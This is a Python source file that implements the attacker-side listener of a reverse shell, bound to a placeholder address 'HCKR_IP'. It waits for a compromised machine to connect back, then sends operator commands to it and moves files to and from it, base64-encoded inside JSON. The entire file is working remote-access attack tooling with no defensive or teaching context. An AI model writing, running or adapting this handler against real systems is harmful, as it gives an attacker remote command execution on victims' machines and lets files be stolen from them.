import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections.")
        self.con, addr = listener.accept()
        print(f"[+] Connection established with {str(addr[0])}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.con.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.con.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, data):
        with open(path, "wb") as file:
            file.write(data)
            return "[+] Download successful"

    def exec_remote(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.con.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)
                result = self.exec_remote(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = base64.b64decode(result)
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)

listener = Listener("HCKR_IP", PORT)
listener.run()
